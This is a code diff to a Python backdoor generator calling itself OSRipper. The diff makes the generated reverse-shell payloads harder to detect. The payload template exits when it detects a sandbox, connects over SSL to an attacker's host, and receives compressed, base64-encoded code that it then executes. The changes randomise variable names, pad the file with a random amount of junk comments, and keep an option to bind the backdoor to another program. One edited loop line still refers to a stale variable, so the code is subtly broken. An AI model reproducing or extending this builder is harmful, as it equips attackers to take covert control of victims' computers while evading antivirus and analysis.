@@ -1,3 +1,7 @@
+########################################
+#------OSRIPPER MASTER V0.2.4.2--------#
+########################################
+
 import os
 import socket
 import shutil
@@ -8,8 +12,17 @@ import string
 import random
 from pickle import GLOBAL
 bind=0
-c=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(9)))
-d=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(9)))
+## RandomVariable
+VariableRange = random.randint(8,22)
+VariableRange2 = random.randint(8,22)
+VariableRange3 = random.randint(8,22)
+RandomisationNum = random.randint(0,77)
+c=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
+d=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
+so=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange))))
+s=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange2))))
+l=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
+dr=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(int(VariableRange3))))
 reps=False
 def logo():
     logo1 = """
@@ -203,8 +216,8 @@ def gen_rev_ssl_tcp():
         ina.write(d+' = '+port)
         ina.write("\n")
         ina.write(c+' = "'+host+'"'+'\n')
-        for i in range(50):
-            a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(50)))
+        for i in range(int(RandomisationNum)):
+            a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,17)))))
             ina.write('#'+a+'\n')
         b = '''
 from sandboxed import is_sandboxed
@@ -213,22 +226,28 @@ certainty = is_sandboxed(logging=False)
 if int(certainty)>0.5:
     sys.exit()
 import zlib,base64,ssl,socket,struct,time
-
+'''
+        ina.write(b)
+        for i in range(int(RandomisationNum)):
+            b3=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(int(random.randint(0,19)))))
+            ina.write('#'+b3+'\n')
+        b2 = '''
 for x in range(10):
 	try:
-		so=socket.socket(2,1)
-		so.connect(('''+c+''','''+d+'''))
-		s=ssl.wrap_socket(so)
+		'''+so+'''=socket.socket(2,1)
+		'''+so+'''.connect(('''+c+''','''+d+'''))
+		'''+s+'''=ssl.wrap_socket('''+so+''')
 		break
 	except:
 		time.sleep(10)
-l=struct.unpack('>I',s.recv(4))[0]
-d=s.recv(l)
-while len(d)<l:
-	d+=s.recv(l-len(d))
-exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+'''+l+'''=struct.unpack('>I','''+s+'''.recv(4))[0]
+'''+dr+'''='''+s+'''.recv('''+l+''')
+while len(d)<'''+l+''':
+	'''+dr+'''+='''+s+'''.recv('''+l+'''-len('''+dr+'''))
+exec(zlib.decompress(base64.b64decode('''+dr+''')),{'s':'''+s+'''})
 '''
-        ina.write(b)
+        ina.write(b2)
+
         opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
         if opt_bind == 'y':
             bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
@@ -496,12 +515,9 @@ def cleanup():
         if reps==True:
             os.remove(name2)
             os.remove(name2+'.spec')
-            os.remove(os.getcwd()+'/dist/ocr_or')
             os.remove('ocr.py')
             os.remove('ocr_or.py')
             os.remove('ocr_or.spec')
-            if platform.system() == 'Darwin':
-                shutil.rmtree(os.getcwd()+'/dist/ocr_or.app')
             if platform.system() == 'Windows':
                 shutil.rmtree(os.getcwd()+'/dist/ocr_or.exe')
         if reps==True:
